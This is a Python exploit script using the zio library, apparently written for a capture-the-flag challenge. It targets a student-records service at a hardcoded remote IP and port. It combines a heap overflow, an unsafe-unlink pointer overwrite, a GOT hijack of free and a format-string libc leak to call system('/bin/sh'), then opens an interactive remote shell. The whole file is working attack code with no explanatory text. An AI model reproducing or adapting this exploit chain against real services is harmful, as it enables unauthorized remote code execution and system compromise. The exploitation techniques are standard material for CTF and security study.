#! /usr/bin/python

from zio import *

#io = zio('./Fin')
io = zio(('120.55.86.95',11111))
libc_sys = 0x0000000000046640
libc_start = 0x0000000000021EC5
got_free = 0x0000000000602018
printf = 0x0000000000400860

prev_size = 0
chunk1_size = 0x90
chunk2_size = 0xa0

point_heap = 0x00000000006020E0 + 16*3 + 8  
point_bk = point_heap - 16
point_fd_low = point_heap - 24
point_fd_high = 0

payload = l32(point_fd_high) + l64(point_bk) + 'a'*0x70 + l64(chunk1_size) + l64(chunk2_size)
Format = "%15$016llx"
io.writeline("2333333333")

#add a student,ID 0
io.read_until("information.")
io.writeline("a")
io.read_until("information:")
io.writeline("07" + "/bin/sh" + "05aaaaa")         #ready to call system


#add a student,ID 1
io.read_until("information.")
io.writeline("a")
io.read_until("information:")
io.writeline( str(len(Format)) + Format + "05aaaaa")            #leak libc addr



#add a student,ID 2
io.read_until("information.")
io.writeline("a")
io.read_until("information:")
io.writeline('18' + '\0'*6 + l64(chunk1_size | 1) + l32(point_fd_low) + '125' + 'a'*125)

#add a student,ID 3
io.read_until("information.")
io.writeline("a")
io.read_until("information:")
io.writeline('03' + '\0'*3 + '127' + 'a'*127)
#now ready to overflow


#add a student,ID 4
io.read_until("information.")
io.writeline("a")
io.read_until("information:")
io.writeline('10' + 'a'*10 + '100' + 'a'*100)
#now ready to overflow

#change student,ID 3
io.read_until("information.")
io.writeline("c")
io.read_until("change")
io.writeline('3')
io.writeline(payload)
#heap is overflow

#delete student.ID 4
io.read_until("information.")
io.writeline("d")
io.read_until("number")
io.writeline('4')

#overwrite point to student info
#change student,ID 3
io.read_until("information.")
io.writeline("c")
io.read_until("change")
io.writeline('3')
io.writeline( l32(30) + l64(got_free - 20) )


#overwrite free function in got -> printf
#change student,ID 3
io.read_until("information.")
io.writeline("c")
io.read_until("change")
io.writeline('3')
io.writeline( l64(printf) )

raw_input("wait debug")
#delete student.ID 1 with format
io.read_until("information.")
io.writeline("d")
io.read_until("number")
io.writeline('1')

addr_start = io.read(17)
addr_start = int(addr_start,16)

print hex(addr_start)

base_addr = addr_start - libc_start
addr_sys = base_addr + libc_sys
print hex(addr_sys)

#overwrite free function in got -> system
#change student,ID 3
io.read_until("information.")
io.writeline("c")
io.read_until("change")
io.writeline('3')
io.writeline( l64(addr_sys) )

#delete student.ID 0 with sh
io.read_until("information.")
io.writeline("d")
io.read_until("number")
io.writeline('0')

io.writeline('ls')

#now shell is got
io.interact()

